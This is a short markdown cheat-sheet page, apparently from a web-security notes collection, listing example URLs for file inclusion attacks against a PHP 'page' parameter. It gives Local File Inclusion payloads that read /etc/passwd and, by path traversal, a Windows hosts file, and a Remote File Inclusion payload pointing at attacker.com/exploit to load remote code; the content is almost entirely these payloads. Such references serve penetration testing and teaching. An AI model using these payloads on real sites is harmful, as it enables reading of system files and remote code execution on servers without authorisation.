---
title: File Inclusion Examples
desc: Examples of Local File Inclusion (LFI) and Remote File Inclusion (RFI).
tags: [Web]
alts: []
website:
render_with_liquid: false
---

## Local File Inclusion (LFI)

```html
https://vulnerable.com/index.php?page=/etc/passwd

<!-- Windows -->
https://vulnerable.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

<br />

## Remote File Inclusion (RFI)

```html
https//vulnerable.com/index.php?page=//attacker.com/exploit
```